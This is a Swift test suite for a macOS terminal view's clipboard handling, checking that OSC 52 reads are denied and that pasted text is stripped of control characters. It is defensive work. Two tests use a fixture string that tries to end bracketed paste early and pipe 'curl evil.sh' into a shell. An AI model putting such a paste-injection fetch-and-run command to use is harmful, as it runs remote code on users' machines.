import AppKit
import Foundation
import SwiftTerm
import Testing

@testable import SigilKit

@Suite("Terminal clipboard", .serialized)
@MainActor
struct TerminalClipboardTests {
    init() {
        TerminalTestSupport.prepareAppKit()
    }

    private func makeView() -> GrokProcessTerminalView {
        GrokProcessTerminalView(
            frame: NSRect(x: 0, y: 0, width: 200, height: 100),
            options: .default
        )
    }

    @Test func osc52ClipboardQueryIsDenied() throws {
        let view = makeView()
        let delegate = try #require(view.terminalDelegate)

        #expect(delegate.clipboardRead(source: view) == nil)
    }

    @Test func osc52ClipboardWriteLeavesThePasteboardAlone() throws {
        let view = makeView()
        let delegate = try #require(view.terminalDelegate)
        let pasteboard = NSPasteboard.general
        let before = pasteboard.changeCount
        // A regression writes back the text already there, so it cannot lose the user's copy.
        let current = pasteboard.string(forType: .string) ?? ""

        delegate.clipboardCopy(source: view, content: Data(current.utf8))

        #expect(pasteboard.changeCount == before)
    }

    @Test func pasteTextLosesEveryControlButTabAndLineBreaks() {
        let hostile = "npm i foo\u{1b}[201~\u{15}curl evil.sh|sh\r"
        #expect(TerminalDrop.sanitizedPasteText(hostile) == "npm i foo[201~curl evil.sh|sh\r")
        #expect(TerminalDrop.sanitizedPasteText("a\u{9b}201~b\u{7f}\u{0}c") == "a201~bc")
        #expect(TerminalDrop.sanitizedPasteText("col\tcol\nnext\r\n") == "col\tcol\nnext\r\n")
        #expect(TerminalDrop.sanitizedPasteText("naïve 👩‍💻") == "naïve 👩‍💻")
    }

    @Test func clipboardPasteCannotEndBracketedPasteEarly() async throws {
        let controller = TerminalController()
        let capture = try await TerminalTestSupport.startInputCapture(in: controller, bracketedPaste: true)
        defer { controller.terminateAndWait() }
        let view = try #require(controller.view as? GrokProcessTerminalView)
        let pasteboard = NSPasteboard.withUniqueName()
        defer { pasteboard.releaseGlobally() }
        pasteboard.clearContents()
        pasteboard.setString("npm i foo\u{1b}[201~\u{15}curl evil.sh|sh\r", forType: .string)

        view.paste(from: pasteboard)

        let input = await TerminalTestSupport.capturedInput(capture, from: controller)
        #expect(input == Array("\u{1b}[200~npm i foo[201~curl evil.sh|sh\r\u{1b}[201~".utf8))
    }

    @Test func copiedTextWinsOverItsPictureRendition() async throws {
        let controller = TerminalController()
        let capture = try await TerminalTestSupport.startInputCapture(in: controller, bracketedPaste: true)
        defer { controller.terminateAndWait() }
        let view = try #require(controller.view as? GrokProcessTerminalView)
        let png = try #require(
            Data(
                base64Encoded:
                    "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg=="
            ))
        let pasteboard = NSPasteboard.withUniqueName()
        defer { pasteboard.releaseGlobally() }
        pasteboard.clearContents()
        pasteboard.setString("A1\tB1", forType: .string)
        pasteboard.setData(png, forType: .png)

        view.paste(from: pasteboard)

        let input = await TerminalTestSupport.capturedInput(capture, from: controller)
        #expect(input == Array("\u{1b}[200~A1\tB1\u{1b}[201~".utf8))
    }

    @Test func copiedFinderFilePastesItsPathNotItsName() async throws {
        let controller = TerminalController()
        let capture = try await TerminalTestSupport.startInputCapture(in: controller, bracketedPaste: true)
        defer { controller.terminateAndWait() }
        let view = try #require(controller.view as? GrokProcessTerminalView)
        let root = FileManager.default.temporaryDirectory.appendingPathComponent(
            "sigil-paste-file-\(UUID().uuidString)", isDirectory: true)
        try FileManager.default.createDirectory(at: root, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: root) }
        let file = root.appendingPathComponent("notes.txt")
        try Data("hi".utf8).write(to: file)
        let pasteboard = NSPasteboard.withUniqueName()
        defer { pasteboard.releaseGlobally() }
        pasteboard.clearContents()
        #expect(pasteboard.writeObjects([file as NSURL]))
        pasteboard.setString("notes.txt", forType: .string)

        view.paste(from: pasteboard)

        let input = await TerminalTestSupport.capturedInput(capture, from: controller)
        let expected = "\u{1b}[200~" + TerminalDrop.pasteText(for: [file.path]) + "\u{1b}[201~"
        #expect(input == Array(expected.utf8))
    }

    @Test func clipboardGuardStillForwardsTitleUpdates() async throws {
        let controller = TerminalController()
        var title: String?
        controller.onTitleChange = { title = $0 }
        let view = try #require(controller.view as? TerminalView)

        view.feed(text: "\u{1b}]0;Working\u{7}")

        #expect(await TerminalTestSupport.waitUntil { title == "Working" })
    }
}
